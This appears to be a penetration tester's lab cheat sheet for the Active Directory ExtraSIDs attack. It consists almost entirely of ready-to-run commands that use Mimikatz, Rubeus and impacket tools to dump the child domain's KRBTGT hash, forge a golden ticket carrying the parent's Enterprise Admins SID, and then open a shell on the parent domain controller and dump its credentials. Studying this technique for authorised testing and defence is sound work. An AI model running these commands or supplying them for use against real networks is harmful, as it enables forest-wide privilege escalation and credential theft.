# ExtraSIDs attack

### <mark style="color:yellow;">ExtraSIDs Attack from Windows</mark>

Domain Trusts - Child -> Parent. After compromising child domain add admin SID to a user for golden ticket.&#x20;

<details>

<summary>Requirements</summary>

```
The KRBTGT hash for the child domain
The SID for the child domain
The name of a target user in the child domain (does not need to exist!)
The FQDN of the child domain.
The SID of the Enterprise Admins group of the root domain.
With this data collected, the attack can be performed with Mimikatz.
```

</details>

#### Get the KRBTGT hash

```powershell
# With secretsdump
secretsdump.py htb-student_adm@10.129.180.47

# Or mimikatz
lsadump::dcsync /user:LOGISTICS\krbtgt
```

#### Get SID of child domain

```powershell
Get-DomainSID
```

#### Get FQDN of child domain

```powershell
Get-DomainTrust
```

#### SID of "Enterprise Admins" group of root domain

```powershell
Get-DomainGroup -Domain ZENCOROP.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

#### Request Golden Ticket

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:ZEN.ZENCORP.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### <mark style="color:yellow;">ExtraSIDs Attack from Linux</mark>

To gather all the information needed.

```bash
# Get KRBTGT
secretsdump.py logistics.zencorp.local/mczen@172.16.5.240 -just-dc-user zencorp/krbtgt

# Get SID
lookupsid.py logistics.zencorp.local/mczen@172.16.5.240 

# Get Enterprise Admins group SID
lookupsid.py logistics.zencorp.local/mczen@172.16.5.240

# Request a ticket with adding admin SID
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain-sid S-1-5-21-2806153819-209893948-922872689 -domain LOGISTICS.ZENCORP.LOCAL -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 mczen

# Connect or Dump hashes
KRB5CCNAME=mczen.ccache smbexec.py -k -no-pass ACADEMY-EA-DC01.ZENCORP.LOCAL
KRB5CCNAME=mczen.ccache secretsdump.py -k -no-pass ACADEMY-EA-DC01.ZENCORP.LOCAL
```

